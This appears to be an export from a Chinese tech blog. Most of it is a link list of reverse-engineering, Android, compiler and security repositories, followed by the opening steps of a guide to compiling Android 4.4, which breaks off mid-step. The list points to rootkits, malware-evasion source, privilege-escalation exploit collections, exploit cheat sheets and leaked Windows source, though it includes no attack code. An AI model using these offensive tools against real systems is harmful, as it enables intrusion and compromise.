<p><a href="https://github.com/Martyx00/CollaRE">CollaRE</a> - CollareRE是用于协作逆向工程的工具，其目的是允许需要在项目期间使用多个工具的团队进行协作，而无需在单独的位置共享文件。</p>
<p><a href="https://github.com/AlienwareHe/awesome-reverse">awesome-reverse</a> - awesome-逆向基础入门，包括JS、安卓APP&#x2F;Native .</p>
<p><a href="https://dmcxblue.gitbook.io/red-team-notes-2-0/">Red Team Notes 2.0</a> - Red Team Notes 2.0。</p>
<p><a href="https://rloura.wordpress.com/2020/12/04/reversing-flutter-for-android-wip/">Flutter Android 逆向分析</a> - Reverse engineering Flutter for Android.</p>
<p><a href="https://github.com/rscloura/Doldrums">Flutter Android 逆向 Doldrums</a> - Doldrums A Flutter&#x2F;Dart reverse engineering tool.</p>
<p><a href="https://github.com/hellodword/xflutter">Flutter Android 逆向 xflutter</a> - Flutter &amp; Android reverse engineering.</p>
<p><a href="https://github.com/deepmind/android_env">android_env</a> - 用于在 Android 设备上进行 RL 研究的库。</p>
<p><a href="https://github.com/Te-k/sdanalyzer">sdanalyzer</a> -<br>分析大量APK文件的工具。</p>
<p><a href="https://github.com/mildsunrise/darter">darter</a> - Dart &#x2F; Flutter VM 快照分析器.</p>
<p><a href="https://github.com/fuzhengwei/itstack-demo-bytecode">itstack-demo-bytecode</a> - 本专栏主要针对字节码编程系列知识栈进行编写文章学习。</p>
<p><a href="https://github.com/ptswarm/reFlutter">reFlutter</a> - Flutter Reverse Engineering Framework. 实现原理：<a href="https://tinyhack.com/2021/03/07/reversing-a-flutter-app-by-recompiling-flutter-engine/">reversing-a-flutter-app-by-recompiling-flutter-engine</a>.</p>
<p><a href="https://github.com/zhkl0228/unidbg">unidbg</a> - About<br>Allows you to emulate an Android ARM32 and&#x2F;or ARM64 native library, and an experimental iOS emulation.</p>
<p><a href="https://github.com/feiyangqingyun/QWidgetDemo">QWidgetDemo</a> - qt 的例子。</p>
<p><a href="https://github.com/artssec/burp-exporter">burp-exporter</a> - Exporter is a Burp Suite extension to copy a request to a file or the clipboard as multiple programming languages functions.</p>
<p><a href="https://github.com/Pithus/bazaar">bazaar</a> - Android security &amp; privacy analysis for the masses.</p>
<p><a href="https://github.com/OpenLoco/decompilation-tools">decompilation-tools</a> - 一些 IDC 脚本，暂时不太清楚有什么用。</p>
<p><a href="https://github.com/FeeiCN/ESD">ESD</a> - Enumeration sub domains(枚举子域名)。</p>
<p><a href="https://github.com/airbus-cert/Yagi">Yagi</a> - Yet Another Ghidra Integration for IDA.</p>
<p><a href="https://github.com/MitalAshok/ptracewrap">ptracewrap</a> - A C++ header-only wrapper around ptrace(2).</p>
<p><a href="https://github.com/g0dA/linuxStack">linuxStack</a> - Linux技术栈.</p>
<p><a href="https://github.com/canliture/nju-software-analysis-homework">nju-software-analysis-homework</a> - 南京大学《软件分析》课程课后作业。</p>
<p><a href="https://github.com/the1812/Malware-Patch">Malware-Patch</a> - 阻止中国流氓软件的管理员授权。</p>
<p><a href="https://github.com/avast/apkverifier">apkverifier</a> - APK Signature verification in Go. Supports scheme v1, v2 and v3 and passes Google apksig’s testing suite.</p>
<p><a href="https://github.com/iluwatar/java-design-patterns">java-design-patterns</a> - Design patterns implemented in Java。</p>
<p><a href="https://github.com/Arinerron/heaptrace">heaptrace</a> - helps visualize heap operations for pwn and debugging.</p>
<p><a href="https://github.com/scutan90/DeepLearning-500-questions">DeepLearning-500-questions</a> - 深度学习500问，以问答形式对常用的概率知识、线性代数、机器学习、深度学习、计算机视觉等热点问题进行阐述，以帮助自己及有需要的读者。 </p>
<p><a href="https://github.com/Lojii/Knot">Knot</a> - 一款iOS端基于MITM(中间人攻击技术)实现的HTTPS抓包工具。</p>
<p><a href="https://github.com/AeonLucid/AndroidNativeEmu">AndroidNativeEmu</a> - Allows you to partly emulate an Android native library.</p>
<p><a href="https://github.com/yhnu/op7t">op7t</a> - oneplus 7t 自定义内核(for 安卓逆向&#x2F;android逆向)。</p>
<p><a href="https://github.com/xbmc/libandroidjni">libandroidjni</a> - Android JNI bindings library.</p>
<p><a href="https://github.com/Ascotbe/Kernelhub">Kernelhub</a> - Windows提权漏洞合集.      </p>
<p><a href="https://github.com/kubo/plthook">plthook</a> - Hook function calls by replacing PLT(Procedure Linkage Table) entries.</p>
<p><a href="https://github.com/rcore-os">rcore-os</a> - THU Rust operating system workshop.</p>
<p><a href="https://github.com/fucking-translation">fucking-translation</a> - 翻译教程。</p>
<p><a href="https://github.com/datawhalechina/pumpkin-book">pumpkin-book</a> - 《机器学习》（西瓜书）公式推导解析.</p>
<p><a href="https://github.com/0xAX/linux-insides">linux-insides</a> - Linux 内核揭秘.</p>
<p><a href="https://github.com/fffaraz/awesome-cpp">awesome-cpp</a> - A curated list of awesome C++ (or C).</p>
<p><a href="https://github.com/jeanboydev/Android-ReadTheFuckingSourceCode">Android-ReadTheFuckingSourceCode</a> - Android-ReadTheFuckingSourceCode.</p>
<p><a href="https://github.com/taoxiongfeng/accumulation">accumulation</a> - 日常工作积累，用于平时工作参考资料。</p>
<p><a href="https://github.com/Launcher3-dev/Launcher3">Launcher3</a> - 基于谷歌Android P 的Launcher3源码。</p>
<p><a href="https://github.com/chyyuu/os_course_info">os_course_info</a> - 清华大学操作系统课程.</p>
<p><a href="https://github.com/zhyingkun/LinuxUnix">LinuxUnix</a> - Linux和Unix相关系统C编程的构建工程，包含众多书籍示例.</p>
<p><a href="https://github.com/downdemo/Cpp-Concurrency-in-Action-2ed">Cpp-Concurrency-in-Action-2ed</a> - C++ Concurrency in Action 2ed 笔记.</p>
<p><a href="https://github.com/KunMinX/Relearn-Android">Relearn-Android</a> - 重学安卓.</p>
<p><a href="https://github.com/FilledStacks/flutter-tutorials">flutter-tutorials</a> - The repo contains the source code for all the tutorials on the FilledStacks Youtube channel.</p>
<p><a href="https://github.com/ashishb/android-security-awesome">android-security-awesome</a> - A collection of android security related resources.</p>
<p><a href="https://github.com/opensource-101">opensource-101</a> -<br>开源101志愿者小分队.</p>
<p><a href="https://github.com/slidoooor/computer_book_list">computer_book_list</a> - 一个综合了豆瓣，goodreads综合评分的计算机书籍书单.</p>
<p><a href="https://github.com/boy-hack/ksubdomain">ksubdomain</a> - Subdomain scanner.</p>
<p><a href="https://github.com/vblanco20-1/vulkan-guide">vulkan-guide</a> - Introductory guide to vulkan.</p>
<p><a href="https://github.com/lief-project/LIEF">LIEF</a> - LIEF - Library to Instrument Executable Formats.</p>
<p><a href="https://github.com/Dvd848/pytai">pytai</a> - Kaitai Struct: Visualizer and HEX Viewer GUI in Python.</p>
<p><a href="https://github.com/threat9/routersploit">routersploit</a> - Exploitation Framework for Embedded Devices.</p>
<p><a href="https://github.com/ErLinErYi/PlantsVsZombies">PlantsVsZombies</a> - PlantsVsZombies game made by cocos2dx 3.16 (c++).</p>
<p><a href="https://github.com/wuchangming/spy-debugger">spy-debugger</a> - 微信调试，各种WebView样式调试、手机浏览器的页面真机调试。</p>
<p><a href="https://github.com/moonAgirl/Exploit-Re">Exploit-Re</a> - exploit study.</p>
<p><a href="https://github.com/android-rooting-tools">android-rooting-tools</a> - android-rooting-tools.</p>
<p><a href="https://github.com/ziishaned/learn-regex">learn-regex</a> - Learn regex the easy way.</p>
<p><a href="https://github.com/SamyPesse/How-to-Make-a-Computer-Operating-System">How-to-Make-a-Computer-Operating-System</a> - How to Make a Computer Operating System in C++.</p>
<p><a href="https://github.com/kon9chunkit/GitHub-Chinese-Top-Charts">GitHub-Chinese-Top-Charts</a> - 🇨🇳 GitHub中文排行榜，帮助你发现高分优秀中文项目、更高效地吸收国人的优秀经验成果；榜单每周更新一次，敬请关注！</p>
<p><a href="https://github.com/M0cK1nG-b1Rd/CTF-Mind-maps">CTF-Mind-maps</a> - 整合入门到中高级题目的思路，for new CTFers !</p>
<p><a href="https://github.com/henrymorgen/android-knowledge-system">android-knowledge-system</a> - Android应用开发最强原创知识体系.</p>
<p><a href="https://github.com/KB5201314/yark">yark</a> - Yet another Rootkit.</p>
<p><a href="https://github.com/zy445566/llvm-guide-zh">llvm-guide-zh</a> - LVM系统的新用户指南,中文翻译版.</p>
<p><a href="https://github.com/Evian-Zhang/llvm-ir-tutorial">llvm-ir-tutorial</a> - LLVM IR入门指南.</p>
<p><a href="https://github.com/xairy/linux-kernel-exploitation">linux-kernel-exploitation</a> - collection of links related to Linux kernel security and exploitation.</p>
<p><a href="https://github.com/woxihuannisja/Android-Reverse-Learn">Android-Reverse-Learn</a> - Android逆向学习笔记.</p>
<p><a href="https://github.com/public-apis/public-apis">public-apis</a> - A collective list of free APIs.</p>
<p><a href="https://github.com/stong/how-to-exploit-a-double-free">how-to-exploit-a-double-free</a> - How to exploit a double free vulnerability in 2021. ‘Use-After-Free for Dummies’.</p>
<p><a href="https://github.com/AlexeySoshin/smali2java">smali2java</a> - Recreate Java code from Smali.</p>
<p><a href="https://github.com/pr0cf5/kernel-exploit-practice">kernel-exploit-practice</a> - repository for kernel exploit practice.</p>
<p><a href="https://github.com/qiang/Riru-ModuleFridaGadget">Riru-ModuleFridaGadget</a> - 一个magisk 的模块，简化版，依赖 riru，能够简单的hook，并且加载动态库，目前用来加载 frida 的gadget 库，从而使hook脱离命令行和server，并且能够在多进程中加载.</p>
<p><a href="https://github.com/freelancer-leon/notes">notes</a> - notes.</p>
<p><a href="https://github.com/arslanbilal/git-cheat-sheet">git-cheat-sheet</a> - git-cheat-sheet.</p>
<p><a href="https://github.com/EmYiQing/CodeInspector">CodeInspector</a> - 基于Java ASM技术和GadgetInspector的原理，尝试实现一个自动Java代码审计工具。</p>
<p><a href="https://github.com/japajoe/StackVMCPP">StackVMCPP</a> - A stack and register based virtual machine which can compile and run arbitrary code in runtime.</p>
<p><a href="https://github.com/riramar/Web-Attack-Cheat-Sheet">Web-Attack-Cheat-Sheet</a> - Web Attack Cheat Sheet.</p>
<p><a href="https://github.com/Zeyad-Azima/Offensive-Resources">Offensive-Resources</a> - A Huge Learning Resources with Labs For Offensive Security Players.</p>
<p><a href="https://github.com/bin2415/fuzzing_paper">fuzzing_paper</a> - fuzzing related paper.</p>
<p><a href="https://github.com/Enna1/LLVM-Clang-Study-Notes">LLVM-Clang-Study-Notes</a> - LLVM&#x2F;Clang学习笔记.</p>
<p><a href="https://github.com/G4rb3n/IoT_Sec_Tutorial">IoT_Sec_Tutorial</a> - IoT安全教程.</p>
<p><a href="https://github.com/metmit/easyFrida">easyFrida</a> - 快速上手开发使用frida.</p>
<p><a href="https://github.com/Cyb3rWard0g/HELK">HELK</a> - Hunting ELK 或简称 HELK 是首批具有高级分析功能的开源狩猎平台之一.</p>
<p><a href="https://github.com/LyleMi/Learn-Web-Hacking">Learn-Web-Hacking</a> - Study Notes For Web Hacking &#x2F; Web安全学习笔记.</p>
<p><a href="https://github.com/cfenollosa/os-tutorial">os-tutorial</a> - How to create an OS from scratch.</p>
<p><a href="https://github.com/helloobaby/Nt5Src-Lite">Nt5Src-Lite</a> - Leaked windows XP src.</p>
<p><a href="https://github.com/zjw-swun/JVMTI_Demo">JVMTI_Demo</a> - android p jvmti&#x2F;android studio apply change.</p>
<p><a href="https://github.com/zjw-swun/AppMethodOrder">AppMethodOrder</a> - 一个能让你了解所有函数调用顺序以及函数耗时的Android库.</p>
<p><a href="https://github.com/helloobaby/ida-plugin">ida-plugin</a> - ida plugin template.</p>
<p><a href="https://github.com/helloobaby/x32_x64dbgPluginTemplate">x32_x64dbgPluginTemplate</a> - x32_x64dbg Plugin Template.</p>
<p><a href="https://github.com/ChoiysApple/Swift-tutorial">Swift-tutorial</a> - Repository for swift online lecture.</p>
<p><a href="https://github.com/Ivan1ee/NET-Deserialize">NET-Deserialize</a> - 总结了十篇.Net反序列化文章，持续更新.</p>
<p><a href="https://github.com/tide-emergency/yingji">yingji</a> - 应急相关内容积累.</p>
<p><a href="https://github.com/corkami/pocs">pocs</a> - Proof of Concepts (PE, PDF…).</p>
<p><a href="https://github.com/corkami/collisions">collisions</a> - Hash collisions and their exploitations.</p>
<p><a href="https://github.com/corkami/pics">pics</a> - 各种文件格式图片。</p>
<p><a href="https://github.com/javiersantos/PiracyChecker">PiracyChecker</a> - An Android library that prevents your app from being pirated &#x2F; cracked using Google Play Licensing (LVL), APK signature protection and more.</p>
<p><a href="https://github.com/RapidAI/RapidOCR">RapidOCR</a> - A cross platform OCR Library based on PaddleOCR &amp; OnnxRuntime.</p>
<p><a href="https://github.com/frankwxu/digital-forensics-lab">digital-forensics-lab</a> - Free hands-on digital forensics labs for students and faculty.</p>
<p><a href="https://github.com/hktalent/51pwn-framework">51pwn-framework</a> - 51pwn-framework.</p>
<p><a href="https://github.com/isrc-cas/flounder">flounder</a> - PLCT实验室维护的ollvm分支。</p>
<p><a href="https://github.com/rust-embedded/rust-raspberrypi-OS-tutorials">rust-raspberrypi-OS-tutorials</a> - Learn to write an embedded OS in Rust.</p>
<p><a href="https://github.com/Arinerron/heaptrace">heaptrace</a> - helps visualize heap operations for pwn and debugging.</p>
<p><a href="https://github.com/RJC497/IoT-Digital-Forensics-Course">IoT-Digital-Forensics-Course</a> - Free IoT Digital Forensics Course with hands-on labs.</p>
<p><a href="https://github.com/e-m-b-a/embark">embark</a> - EMBArk - The firmware security scanning environment.</p>
<p><a href="https://github.com/AvatarQing/Gradle-Plugin-User-Guide-Chinese-Verision">Gradle-Plugin-User-Guide-Chinese-Verision</a> - Gradle Plugin User Guide 中文翻译.</p>
<p><a href="https://github.com/DedSecInside/TorBot">TorBot</a> - Dark Web OSINT Tool.</p>
<p><a href="https://github.com/below/HelloSilicon">HelloSilicon</a> - An introduction to ARM64 assembly on Apple Silicon Macs.</p>
<p><a href="https://github.com/CodingDocs/awesome-idea-tutorial">awesome-idea-tutorial</a> - IntelliJ IDEA 使用指南 | 必备插件推荐 | 插件开发入门 | 重构小技巧 | 源码阅读技巧。</p>
<p><a href="https://github.com/TADSG/aosp-study">aosp-study</a> - The study note of AOSP.</p>
<p><a href="https://github.com/rigtorp/awesome-modern-cpp">awesome-modern-cpp</a> - A collection of resources on modern C++.</p>
<p><a href="https://github.com/nomi-sec/PoC-in-GitHub">PoC-in-GitHub</a> - 📡 PoC auto collect from GitHub. ⚠️ Be careful Malware.</p>
<p><a href="https://github.com/zhengjim/camille">camille</a> - 基于Frida的Android App隐私合规检测辅助工具.</p>
<p><a href="https://github.com/TonyChen56/WeChatRobot">WeChatRobot</a></p>
<p><a href="https://github.com/clxering/Effective-Java-3rd-edition-Chinese-English-bilingual">Effective-Java-3rd-edition-Chinese-English-bilingual</a> - Effective Java（第3版）各章节的中英文学习参考（已完成）.</p>
<p><a href="https://github.com/WallBreaker2/op">op</a> - Windows消息模拟,gdi,dx,opengl截图，找图,找字(OCR)等功能.</p>
<p><a href="https://github.com/Rvn0xsy/BadCode">BadCode</a> - 恶意代码逃逸源代码.</p>
<p><a href="https://github.com/kabeor/Unicorn-Engine-Documentation">Unicorn-Engine-Documentation</a> - Official Unicorn CPU emulator framework API documentation.</p>
<p><a href="https://github.com/BluePointLilac/ContextMenuManager">ContextMenuManager</a> - 纯粹的Windows右键菜单管理程序.</p>
<p><a href="https://github.com/BlueMatthew/WechatExporter">WechatExporter</a> - Wechat Chat History Exporter 微信聊天记录导出程序.</p>
<p><a href="https://github.com/NIKJOO/x86-Code-Virtualizer">x86-Code-Virtualizer</a> - x86 Binary Code Virtualization Tool.</p>
<p><a href="https://github.com/liancheng/llvm-tutorial-cn">llvm-tutorial-cn</a> - Simplified Chinese translation for the LLVM Tutorial.</p>
<p><a href="https://github.com/nothings/single_file_libs">single_file_libs</a> - List of single-file C&#x2F;C++ libraries.</p>
<p><a href="https://github.com/CrackerCat/LearnOpenGL">LearnOpenGL</a> - LearnOpenGL代码，入门OpenGL。</p>
<p><a href="https://github.com/su-vikas/Presentations">Presentations</a> - About Slides and other material from various conference presentations.</p>
<p><a href="https://github.com/Qazwar/limevisor">limevisor</a> - a simple, incomplete hypervisor.</p>
<p><a href="https://github.com/r0eXpeR/supplier">supplier</a> - 主流供应商的一些攻击性漏洞汇总.</p>
<p><a href="https://github.com/stealthcopter/AndroidNetworkTools">AndroidNetworkTools</a> - Set of useful android network tools.</p>
<p><a href="https://github.com/Wenzel/checksec.py">checksec</a> - Checksec tool in Python, Rich output. Based on LIEF.</p>
<p><a href="https://github.com/ChenJunsen/Hegui3.0">Hegui</a> - 工信部合规检测Xposed模块源码.</p>
<p><a href="https://github.com/fungos/cr">cr</a> - cr.h: A Simple C Hot Reload Header-only Library.</p>
<p><a href="https://github.com/epi052/fuzzing-101-solutions">fuzzing-101-solutions</a> - Companion repository to the Fuzzing101 with LibAFL series of blog posts.</p>
<p><a href="https://github.com/mav8557/Father">Father</a> - LD_PRELOAD rootkit.</p>
<p><a href="https://github.com/sharif-dev/AndroidKernelVulnerability">AndroidKernelVulnerability</a> - Triggering and Analyzing Android Kernel Vulnerability CVE-2019-2215.</p>
<p><a href="https://github.com/antonio-morales/Fuzzing101">Fuzzing101</a> - Fuzzing-101.</p>
<p><a href="https://github.com/MCMrARM/axml-parser">axml-parser</a> - A simple AXML parser written in C++.</p>
<p><a href="https://github.com/sunym1993/flash-linux0.11-talk">flash-linux0.11-talk</a> -  像小说一样品读 Linux 0.11 核心代码.</p>
<p><a href="https://github.com/threedr3am/learnjavabug">learnjavabug</a> - Java安全相关的漏洞和技术demo.</p>
<p><a href="https://github.com/lasarus/C-Compiler">C-Compiler</a> - Yet another C compiler.</p>
<p><a href="https://github.com/ComodoSecurity/openedr">openedr</a> - Open EDR public repository.</p>
<p><a href="https://github.com/makeloveandroid/apphook">apphook</a> - 一款基于xposed做的分析插件.</p>
<p><a href="https://github.com/spring2go/cs_study_plan">cs_study_plan</a> - 一份硬核计算机科学CS自学计划.</p>
<p><a href="https://github.com/CrackerCat/thc-tips-tricks-hacks-cheat-sheet">thc-tips-tricks-hacks-cheat-sheet</a> - Various tips &amp; tricks.</p>
<p><a href="https://github.com/S3cur3Th1sSh1t/Pentest-Tools">Pentest-Tools</a> - Pentest-Tools.</p>
<p><a href="https://github.com/rougier/CPP-Crash-Course">CPP-Crash-Course</a> - C++ Crash Course.</p>
<p><a href="https://github.com/ElivenLZY/AndroidSafeCheck">AndroidSafeCheck</a> - APP过等保要用到的安全检测，支持调试检测&#x2F;签名校验&#x2F;Root检测&#x2F;网络代理检测等，功能高度灵活可定制。</p>
<p><a href="https://github.com/hackerscrolls/SecurityTips">SecurityTips</a> - SecurityTips.</p>
<p><a href="https://github.com/grimm-co/NotQuite0DayFriday">NotQuite0DayFriday</a> - 这是一个 repo，它记录了真实软件中的真实错误，以说明趋势，了解如何预防或更快地找到它们。</p>
<p><a href="https://github.com/ixty/mandibule">mandibule</a> - linux elf injector for x86 x86_64 arm arm64.</p>
<p><a href="https://github.com/simple-android-framework/android_design_patterns_analysis">android_design_patterns_analysis</a> - Android源码设计模式分析开源项目.</p>
<p><a href="https://github.com/pangudashu/php7-internal">php7-internal</a> - PHP7内核剖析.</p>
<p><a href="https://github.com/havenow/AndroidGameModify">AndroidGameModify</a> - Android 逆向笔记。</p>
<p><a href="https://github.com/zsdlove/ApkVulCheck">ApkVulCheck</a> - 安卓漏洞扫描工具.</p>
<p><a href="https://github.com/StarCrossPortal/bug-hunting-101">bug-hunting-101</a> - bug-hunting-101</p>
<p><a href="https://github.com/StarCrossPortal">StarCrossPortal</a> - 星阑科技PortalLab实验室 .</p>
<p><a href="https://github.com/DavadDi/bpf_study">bpf_study</a> - bpf 学习仓库.</p>
<p><a href="https://github.com/tuoxie007/play_with_llvm">play_with_llvm</a> - A book about LLVM &amp; Clang（中文开源书：玩转 LLVM）</p>
<p><a href="https://github.com/gerhart01/Hyper-V-Internals">Hyper-V-Internals</a> - 有关 Hyper-V 的内部信息.</p>
<p><a href="https://github.com/debauchee/barrier">barrier</a> - Open-source KVM software.</p>
<p><a href="https://github.com/netdata/kernel-collector">kernel-collector</a> - Linux Kernel eBPF Collectors.</p>
<p><a href="https://github.com/TartanLlama/minidbg">minidbg</a> - A mini x86 linux debugger for teaching purposes.</p>
<p><a href="https://github.com/v8blink/v8-JavaScript-Documents">v8-JavaScript-Documents</a> - 《Chrome V8原理讲解》系列技术文章.</p>
<p><a href="https://github.com/bisqwit/compiler_series">compiler_series</a> - 创建编译器视频课程系列的材料。</p>
<p><a href="https://github.com/PacktPublishing/Hands-On-Network-Programming-with-C">Hands-On-Network-Programming-with-C</a> - 使用 C 进行网络编程实践.</p>
<p><a href="https://github.com/liwugang/pkcs7">pkcs7</a> - pkcs7- this is parse the CERT.RSA file.</p>
<p><a href="https://github.com/AlfredTheBest/Design-Pattern">Design-Pattern</a> - 设计模式。</p>
<p><a href="https://github.com/AlfredTheBest/git-handbook">git-handbook</a> -  git简易使用手册.</p>
<p><a href="https://github.com/riba2534/TCP-IP-NetworkNote">TCP-IP-NetworkNote</a> - 《TCP&#x2F;IP网络编程》学习笔记.</p>
<p><a href="https://github.com/mkowsiak/jnicookbook">jnicookbook</a> - jnicookbook 在本书中，您可以找到我多年来使用 JNI 编写的 JNI 相关代码。</p>
<p><a href="https://github.com/dendibakh/perf-book">perf-book</a> - 《现代 CPU 的性能分析和调优》一书</p>
<p><a href="https://github.com/DhavalKapil/heap-exploitation">heap-exploitation</a> - This book on heap exploitation is a guide to understanding the internals of glibc’s heap and various attacks possible on the heap structure.</p>
<p><a href="https://github.com/dunwu/linux-tutorial">linux-tutorial</a> -  linux-tutorial 是一个 Linux 教程。</p>
<p><a href="https://github.com/PKUFlyingPig/pku-cs-self-learning">pku-cs-self-learning</a> - 计算机自学指南.</p>
<p><a href="https://github.com/duguying/parsing-techniques">parsing-techniques</a> - parsing-techniques.</p>
<p><a href="https://github.com/Fare9/KUNAI-static-analyzer">KUNAI-static-analyzer</a> - 该工具旨在通过使用中间表示提供对不同文件格式的二进制分析。</p>
<p><a href="https://github.com/weiwosuoai/docker-tutorial">docker-tutorial</a> - Docker 学习教程.</p>
<p><a href="https://github.com/bit4woo/burp-api-drops">burp-api-drops</a> - burp插件开发指南.</p>
<p><a href="https://breaking-bits.gitbook.io/breaking-bits/exploit-development/linux-kernel-exploit-development">linux-kernel-exploit-development</a> - Linux kernel exploit development</p>
<p><a href="https://www.ashw.io/blog">Ash Wilding’s Arm Architecture Blog</a> - Ash Wilding’s Arm Architecture Blog</p>
<p><a href="https://github.com/V33RU/IoTSecurity101">IoTSecurity101</a> - From IoT Pentesting to IoT Security.</p>
<p><a href="https://github.com/ashwio/arm64-hypervisor-tutorial">arm64-hypervisor-tutorial</a> - arm64-hypervisor-tutorial.</p>
<p><a href="https://daniel.haxx.se/docs/">docs</a> - Internet protocols and tools related documentation.</p>
<p><a href="https://github.com/0voice/linux_kernel_wiki">linux_kernel_wiki</a> - linux内核学习资料：200+经典内核文章，100+内核论文，50+内核项目，500+内核面试题，80+内核视频.</p>
<p><a href="https://github.com/zu1k/LibAFL-Book-zh">LibAFL-Book-zh</a> - LibAFL 文档书 简体中文版。</p>
<p><a href="https://github.com/0voice/kernel_new_features">kernel_new_features</a> - 深挖 Linux 内核的新功能特性，以 io_uring, cgroup, ebpf, llvm 为代表，包含开源项目，代码案例，文章，视频，架构脑图等.</p>
<p><a href="https://github.com/dunwu/db-tutorial">db-tutorial</a> - db-tutorial 是一个数据库教程。</p>
<p><a href="https://github.com/Ciyfly/Source_code_learning">Source_code_learning</a> - 阅读各种源码写的笔记.</p>
]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>安卓4.4系统源码编译并刷机</title>
    <url>/2019/11/08/%E5%AE%89%E5%8D%934-4%E7%B3%BB%E7%BB%9F%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%B9%B6%E5%88%B7%E6%9C%BA/</url>
    <content><![CDATA[<!-- TOC -->

<ul>
<li><a href="#%E5%AE%89%E5%8D%9344%E7%B3%BB%E7%BB%9F%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91">安卓4.4系统源码编译</a><ul>
<li><a href="#%E4%B8%80-%E5%AE%89%E8%A3%85java-jdk-6%E7%8E%AF%E5%A2%83">一. 安装Java JDK 6环境</a><ul>
<li><a href="#1-%E5%A4%8D%E5%88%B6jdk%E5%88%B0%E5%AE%89%E8%A3%85%E7%9B%AE%E5%BD%95">1. 复制JDK到安装目录</a></li>
<li><a href="#2-%E5%88%87%E6%8D%A2%E5%88%B0%E6%A1%8C%E9%9D%A2%E5%A4%8D%E5%88%B6%E5%AE%89%E5%8D%93%E6%96%87%E4%BB%B6%E5%88%B0%E5%AE%89%E8%A3%85%E7%9B%AE%E5%BD%95">2. 切换到桌面，复制安卓文件到安装目录</a></li>
<li><a href="#3-%E5%AE%89%E8%A3%85jdk">3. 安装jdk</a></li>
<li><a href="#4-%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F">4. 配置环境变量</a></li>
</ul>
</li>
<li><a href="#%E4%BA%8C%E5%AE%89%E8%A3%85%E4%BE%9D%E8%B5%96%E5%BA%93">二、安装依赖库</a></li>
<li><a href="#%E4%B8%89%E9%99%8D%E7%BA%A7make">三、降级make</a></li>
<li><a href="#%E5%9B%9B%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD">四、源码下载</a></li>
<li><a href="#%E4%BA%94%E4%B8%8B%E8%BD%BD%E9%A9%B1%E5%8A%A8">五、下载驱动</a></li>
<li><a href="#%E5%85%AD%E5%BC%80%E5%A7%8B%E7%BC%96%E8%AF%91">六、开始编译</a></li>
<li><a href="#%E4%B8%83%E5%88%B7%E5%85%A5%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8">七、刷入目标机器</a></li>
<li><a href="#%E5%85%AB%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9D%91">八、遇到的一些坑</a><ul>
<li><a href="#1-%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B%E7%A7%8D%E7%AA%81%E7%84%B6%E4%B8%AD%E6%AD%A2%E6%80%8E%E4%B9%88%E9%83%BD%E6%89%BE%E4%B8%8D%E5%88%B0%E5%8E%9F%E5%9B%A0">1. 编译过程种突然中止，怎么都找不到原因</a></li>
<li><a href="#2-adb%E5%92%8Cfastboot%E9%83%BD%E6%B2%A1%E6%9C%89%E6%9D%83%E9%99%90">2. adb和fastboot都没有权限</a></li>
<li><a href="#3-adb%E4%BB%A5%E5%8F%8Afastboot%E8%BF%90%E8%A1%8C%E5%90%8E%E6%8F%90%E7%A4%BA%E9%9C%80%E8%A6%81%E5%AE%89%E8%A3%85">3. adb以及fastboot运行后提示需要安装</a></li>
<li><a href="#4-%E5%88%B7%E6%9C%BA%E5%90%8E%E8%BF%9B%E4%B8%8D%E4%BA%86%E7%B3%BB%E7%BB%9F%E5%8F%AF%E8%83%BD%E6%98%AFfastboot%E7%89%88%E6%9C%AC%E8%BF%87%E9%AB%98%E7%9A%84%E5%8E%9F%E5%9B%A0">4. 刷机后进不了系统，可能是fastboot版本过高的原因。</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<!-- /TOC -->

<h1 id="安卓4-4系统源码编译"><a href="#安卓4-4系统源码编译" class="headerlink" title="安卓4.4系统源码编译"></a>安卓4.4系统源码编译</h1><h2 id="一-安装Java-JDK-6环境"><a href="#一-安装Java-JDK-6环境" class="headerlink" title="一. 安装Java JDK 6环境"></a>一. 安装Java JDK 6环境</h2><h3 id="1-复制JDK到安装目录"><a href="#1-复制JDK到安装目录" class="headerlink" title="1. 复制JDK到安装目录"></a>1. 复制JDK到安装目录</h3><p>假设JDK安装文件放在桌面，我们要安装的目录为：&#x2F;usr&#x2F;local&#x2F;Java。<br>我们先在 &#x2F;usr&#x2F;local&#x2F;目录下创建java文件夹：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ckcat@ubuntu-machine:~$ cd /usr/local</span><br><span class="line">ckcat@ubuntu-machine:/usr/local$ ls</span><br><span class="line">bin  etc  games  include  lib  man  sbin  share  src</span><br><span class="line">ckcat@ubuntu-machine:/usr/local$ sudo mkdir java</span><br><span class="line">ckcat@ubuntu-machine:/usr/local$ ls</span><br><span class="line">bin  etc  games  include  java  lib  man  sbin  share  src</span><br></pre></td></tr></table></figure>
<h3 id="2-切换到桌面，复制安卓文件到安装目录"><a href="#2-切换到桌面，复制安卓文件到安装目录" class="headerlink" title="2. 切换到桌面，复制安卓文件到安装目录"></a>2. 切换到桌面，复制安卓文件到安装目录</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ckcat@ubuntu-machine:~$ sudo cp jdk-6u45-linux-x64.bin /usr/local/java</span><br></pre></td></tr></table></figure>

<h3 id="3-安装jdk"><a href="#3-安装jdk" class="headerlink" title="3. 安装jdk"></a>3. 安装jdk</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ckcat@ubuntu-machine:~$ cd /usr/local</span><br><span class="line">ckcat@ubuntu-machine:/usr/local$ ls</span><br><span class="line">bin  etc  games  include  java  lib  man  sbin  share  src</span><br><span class="line">ckcat@ubuntu-machine:/usr/local$ cd java/</span><br><span class="line">ckcat@ubuntu-machine:/usr/local/java$ sudo chmod 777 jdk-6u45-linux-x64.bin </span><br><span class="line">ckcat@ubuntu-machine:/usr/local/java$ sudo ./jdk-6u45-linux-x64.bin  </span><br></pre></td></tr></table></figure>
<h3 id="4-配置环境变量"><a href="#4-配置环境变量" class="headerlink" title="4. 配置环境变量"></a>4. 配置环境变量</h3><ol>
<li><p>打开&#x2F;ect&#x2F;profile 文件</p>
